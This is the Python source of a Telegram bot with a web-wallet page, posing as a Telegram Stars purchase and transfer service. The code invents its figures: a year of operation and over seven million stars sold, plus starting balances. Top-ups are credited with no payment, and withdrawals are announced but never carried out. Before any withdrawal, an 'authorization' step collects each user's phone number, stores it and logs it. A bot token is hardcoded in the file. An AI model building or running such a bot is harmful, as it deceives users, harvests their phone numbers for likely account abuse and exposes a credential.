import asyncio
import logging
import os
from decimal import Decimal
from typing import Dict
from datetime import datetime, timedelta
import random
import string
import json

from aiohttp import web
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = os.getenv("BOT_TOKEN", "8566540708:AAGJDm2B2nXOL4AQ93uuatI0WYce59vAdOc")
WEBHOOK_URL = os.getenv("RAILWAY_STATIC_URL", "")
WEBHOOK_PATH = "/webhook"
PORT = int(os.getenv("PORT", 8000))
WEBAPP_URL = os.getenv("WEBAPP_URL", "https://your-webapp-url.com")

# Инициализация
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class UserStates(StatesGroup):
    waiting_for_amount = State()

# Хранилища данных
auto_buyer_status = {}
user_balances = {}
user_transactions = {}
user_phones = {}

def get_user_balance(user_id: int) -> Dict[str, Decimal]:
    if user_id not in user_balances:
        user_balances[user_id] = {"stars": Decimal('100.00'), "gems": Decimal('50.00'), "referral": Decimal('25.00')}
    return user_balances[user_id]

def update_balance(user_id: int, amount: Decimal, currency: str = "stars", operation: str = "add") -> bool:
    balance = get_user_balance(user_id)
    if operation == "add":
        balance[currency] += amount
    elif operation == "subtract":
        if balance[currency] >= amount:
            balance[currency] -= amount
        else:
            return False
    
    if user_id not in user_transactions:
        user_transactions[user_id] = []
    user_transactions[user_id].append({
        "timestamp": datetime.now(),
        "amount": amount,
        "currency": currency,
        "operation": operation,
        "description": f"{operation.title()} {amount} {currency}"
    })
    return True

@dp.message(CommandStart())
async def start_command(message: types.Message):
    get_user_balance(message.from_user.id)
    
    welcome_text = (
        "<b>Привет! Это удобный бот для покупки/передачи звезд в Telegram.</b>\n\n"
        "<blockquote>С помощью него можно моментально покупать и передавать звезды.\n\n"
        "Бот работает почти год, и с помощью него куплена большая доля звезд в Telegram.</blockquote>\n\n"
        "С помощью бота куплено:\n"
        "<b>7,357,760</b> ⭐ (~ <b>$110,366</b>)"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💻 Веб-Кошелек", web_app=WebAppInfo(url=WEBAPP_URL))],
        [InlineKeyboardButton(text="💫 Вывести звезды", callback_data="withdraw_stars")],
        [InlineKeyboardButton(text="🎁 Автоскупщик подарков", callback_data="gift_buyer")],
        [InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet"), InlineKeyboardButton(text="🏪 Магазин", callback_data="shop")],
        [InlineKeyboardButton(text="💰 Пополнить Баланс", callback_data="add_balance")],
        [InlineKeyboardButton(text="⭐ Создать чек", callback_data="create_check")]
    ])
    
    await message.answer(welcome_text, reply_markup=keyboard, parse_mode="HTML")

@dp.callback_query(lambda c: c.data == "wallet")
async def wallet_handler(callback: types.CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    balance = get_user_balance(user_id)
    
    wallet_text = (
        "👛 <b>Ваш Кошелек</b>\n\n"
        f"<blockquote>В кошельке: {balance['stars']} ⭐, {balance['gems']} ✨</blockquote>\n\n"
        f"Реферальный Баланс: {balance['referral']}$"
    )
    
    wallet_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 История транзакций", callback_data="transaction_history")],
        [InlineKeyboardButton(text="💰 Пополнить Баланс", callback_data="add_balance")],
        [InlineKeyboardButton(text="💫 Вывести звезды", callback_data="withdraw_stars")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await callback.message.edit_text(wallet_text, reply_markup=wallet_keyboard, parse_mode="HTML")

@dp.callback_query(lambda c: c.data == "gift_buyer")
async def gift_buyer_handler(callback: types.CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    current_status = auto_buyer_status.get(user_id, False)
    auto_buyer_status[user_id] = not current_status
    new_status = auto_buyer_status[user_id]
    status_text = "✅" if new_status else "❌"
    
    gift_text = (
        "🤖 <b>Авто-скупщик подарков</b>\n\n"
        "<blockquote>Как только выйдут новые подарки, бот скинет вам сообщения с визуализацией подарка через анимированный стикер и с меню для покупки подарка.</blockquote>"
    )
    
    gift_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"Авто-скупщик: {status_text}", callback_data="toggle_auto_buyer")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await callback.message.edit_text(gift_text, reply_markup=gift_keyboard, parse_mode="HTML")

@dp.callback_query(lambda c: c.data == "back_to_menu")
async def back_to_menu_handler(callback: types.CallbackQuery):
    await callback.answer()
    await start_command(callback.message)

@dp.message(lambda message: message.web_app_data)
async def web_app_data_handler(message: types.Message):
    try:
        data = json.loads(message.web_app_data.data)
        action = data.get('action')
        
        if action == 'request_phone_auth':
            from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
            phone_keyboard = ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text="📱 Отправить номер телефона", request_contact=True)]],
                resize_keyboard=True, one_time_keyboard=True
            )
            await message.answer(
                "🔐 <b>Авторизация для вывода звезд</b>\n\nДля вывода звезд необходимо авторизоваться через номер телефона.\n\nНажмите кнопку ниже, чтобы отправить ваш номер телефона:",
                reply_markup=phone_keyboard, parse_mode="HTML"
            )
            
        elif action == 'topup':
            amount = data.get('amount', 0)
            user_id = message.from_user.id
            update_balance(user_id, Decimal(str(amount)), "stars", "add")
            await message.answer(
                f"✅ <b>Баланс пополнен!</b>\n\n💫 Получено: {amount} ⭐ звезд\n💰 Средства зачислены на ваш баланс",
                parse_mode="HTML"
            )
            
        elif action == 'withdraw':
            amount = data.get('amount', 0)
            user_id = message.from_user.id
            
            if user_id not in user_phones:
                await message.answer("❌ <b>Необходима авторизация</b>\n\nДля вывода звезд необходимо авторизоваться через номер телефона.", parse_mode="HTML")
                return
            
            balance = get_user_balance(user_id)
            if balance["stars"] >= Decimal(str(amount)):
                update_balance(user_id, Decimal(str(amount)), "stars", "subtract")
                await message.answer(
                    f"✅ <b>Вывод обработан!</b>\n\n💫 Выведено: {amount} ⭐ звезд\n💰 Средства будут переведены в течение 24 часов",
                    parse_mode="HTML"
                )
            else:
                await message.answer(
                    f"❌ <b>Недостаточно средств</b>\n\nНа вашем балансе: {balance['stars']} ⭐\nЗапрошено: {amount} ⭐",
                    parse_mode="HTML"
                )
    except Exception as e:
        logger.error(f"Ошибка обработки данных веб-приложения: {e}")
        await message.answer("❌ Произошла ошибка при обработке запроса")

@dp.message(lambda message: message.contact)
async def contact_handler(message: types.Message):
    contact = message.contact
    user_id = message.from_user.id
    phone_number = contact.phone_number
    user_phones[user_id] = phone_number
    
    from aiogram.types import ReplyKeyboardRemove
    await message.answer(
        f"✅ <b>Авторизация успешна!</b>\n\n📱 Номер телефона: {phone_number}\n🔐 Теперь вы можете выводить звезды\n\nВернитесь в веб-кошелек для продолжения.",
        reply_markup=ReplyKeyboardRemove(), parse_mode="HTML"
    )
    logger.info(f"Пользователь {user_id} авторизовался с номером {phone_number}")

# Веб-приложение HTML
WEBAPP_HTML = '''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Веб-Кошелек</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1a1a1a; color: #ffffff; min-height: 100vh; }
        .container { max-width: 400px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { font-size: 24px; font-weight: 600; color: #ffffff; }
        .balance-card { background: #2a2a2a; border-radius: 16px; padding: 24px; margin-bottom: 24px; text-align: center; border: 1px solid #333; }
        .balance-amount { font-size: 32px; font-weight: 700; color: #ffffff; margin-bottom: 8px; }
        .balance-label { font-size: 14px; color: #999; }
        .tabs { display: flex; background: #2a2a2a; border-radius: 12px; padding: 4px; margin-bottom: 24px; border: 1px solid #333; }
        .tab { flex: 1; padding: 12px; text-align: center; border-radius: 8px; cursor: pointer; transition: all 0.3s; font-weight: 500; color: #999; }
        .tab.active { background: #3390ec; color: #ffffff; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .amount-buttons { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
        .amount-btn { background: #2a2a2a; color: #ffffff; border: 1px solid #333; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 500; cursor: pointer; transition: all 0.2s; }
        .amount-btn:hover { background: #3a3a3a; border-color: #3390ec; }
        .custom-amount { background: #2a2a2a; border: 1px solid #333; border-radius: 12px; padding: 16px; width: 100%; font-size: 16px; color: #ffffff; margin-bottom: 20px; }
        .action-btn { background: #3390ec; color: #ffffff; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 500; cursor: pointer; width: 100%; transition: all 0.2s; }
        .withdraw-info { background: #2a2a2a; border: 1px solid #333; border-radius: 12px; padding: 16px; margin-bottom: 20px; }
        .withdraw-info h3 { color: #3390ec; margin-bottom: 8px; font-size: 16px; }
        .withdraw-info p { color: #ccc; font-size: 14px; line-height: 1.4; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h1>💻 Веб-Кошелек</h1></div>
        <div class="balance-card">
            <div class="balance-amount">100 ⭐</div>
            <div class="balance-label">Ваш баланс</div>
        </div>
        <div class="tabs">
            <div class="tab active" onclick="switchTab('topup')">💰 Пополнить</div>
            <div class="tab" onclick="switchTab('withdraw')">💫 Вывести</div>
        </div>
        <div id="topup-content" class="tab-content active">
            <div class="amount-buttons">
                <button class="amount-btn" onclick="selectAmount(25)">⭐ 25</button>
                <button class="amount-btn" onclick="selectAmount(50)">⭐ 50</button>
                <button class="amount-btn" onclick="selectAmount(100)">⭐ 100</button>
                <button class="amount-btn" onclick="selectAmount(250)">⭐ 250</button>
                <button class="amount-btn" onclick="selectAmount(500)">⭐ 500</button>
                <button class="amount-btn" onclick="selectAmount(1000)">⭐ 1000</button>
            </div>
            <input type="number" class="custom-amount" placeholder="Или введите свою сумму" id="custom-topup">
            <button class="action-btn" onclick="topupBalance()">💰 Пополнить баланс</button>
        </div>
        <div id="withdraw-content" class="tab-content">
            <div class="withdraw-info">
                <h3>🔐 Авторизация</h3>
                <p>Для вывода звезд необходимо авторизоваться через номер телефона.</p>
            </div>
            <div id="auth-section">
                <button class="action-btn" onclick="requestPhoneAuth()" style="margin-bottom: 20px;">📱 Авторизоваться через телефон</button>
            </div>
        </div>
    </div>
    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        let selectedAmount = 0;
        
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(tabName + '-content').classList.add('active');
        }
        
        function selectAmount(amount) {
            selectedAmount = amount;
            document.getElementById('custom-topup').value = amount;
            document.querySelectorAll('#topup-content .amount-btn').forEach(btn => {
                btn.style.background = '#2a2a2a';
                btn.style.borderColor = '#333';
            });
            event.target.style.background = '#3390ec';
            event.target.style.borderColor = '#3390ec';
        }
        
        function requestPhoneAuth() {
            tg.showConfirm('Для авторизации бот запросит ваш номер телефона. Продолжить?', (confirmed) => {
                if (confirmed) {
                    tg.sendData(JSON.stringify({ action: 'request_phone_auth' }));
                    tg.close();
                }
            });
        }
        
        function topupBalance() {
            const customAmount = document.getElementById('custom-topup').value;
            const amount = customAmount || selectedAmount;
            if (!amount || amount <= 0) {
                tg.showAlert('Выберите сумму для пополнения');
                return;
            }
            tg.showConfirm(`Пополнить баланс на ${amount} ⭐?`, (confirmed) => {
                if (confirmed) {
                    tg.sendData(JSON.stringify({ action: 'topup', amount: amount }));
                    tg.close();
                }
            });
        }
    </script>
</body>
</html>'''

# API обработчики
async def get_balance_api(request):
    try:
        user_id = int(request.query.get('user_id', 0))
        if not user_id:
            return web.json_response({'error': 'user_id required'}, status=400)
        balance = get_user_balance(user_id)
        is_authorized = user_id in user_phones
        return web.json_response({
            'balance': float(balance['stars']),
            'gems': float(balance['gems']),
            'referral': float(balance['referral']),
            'authorized': is_authorized
        })
    except Exception as e:
        logger.error(f"Ошибка API баланса: {e}")
        return web.json_response({'error': 'Internal server error'}, status=500)

async def webhook_handler(request):
    try:
        update = types.Update.model_validate(await request.json(), from_attributes=True)
        await dp.feed_update(bot, update)
        return web.Response(status=200)
    except Exception as e:
        logger.error(f"Ошибка webhook: {e}")
        return web.Response(status=500)

async def webapp_handler(request):
    return web.Response(text=WEBAPP_HTML, content_type='text/html')

async def health_check(request):
    return web.json_response({'status': 'ok', 'timestamp': datetime.now().isoformat()})

async def setup_webhook():
    if WEBHOOK_URL:
        webhook_url = f"{WEBHOOK_URL}{WEBHOOK_PATH}"
        await bot.set_webhook(webhook_url)
        logger.info(f"Webhook установлен: {webhook_url}")

async def create_app():
    app = web.Application()
    app.router.add_get('/api/balance', get_balance_api)
    app.router.add_get('/health', health_check)
    app.router.add_post(WEBHOOK_PATH, webhook_handler)
    app.router.add_get('/', webapp_handler)
    return app

async def main():
    logger.info("🚀 Запуск бота на Railway...")
    
    from aiogram.types import BotCommand
    commands = [BotCommand(command="start", description="🚀 Запустить бота")]
    await bot.set_my_commands(commands)
    
    app = await create_app()
    await setup_webhook()
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    
    logger.info(f"✅ Сервер запущен на порту {PORT}")
    logger.info(f"🌐 Webhook URL: {WEBHOOK_URL}{WEBHOOK_PATH}")
    
    try:
        await asyncio.Future()
    except KeyboardInterrupt:
        logger.info("⏹️ Остановка сервера...")
    finally:
        await bot.session.close()
        await runner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())
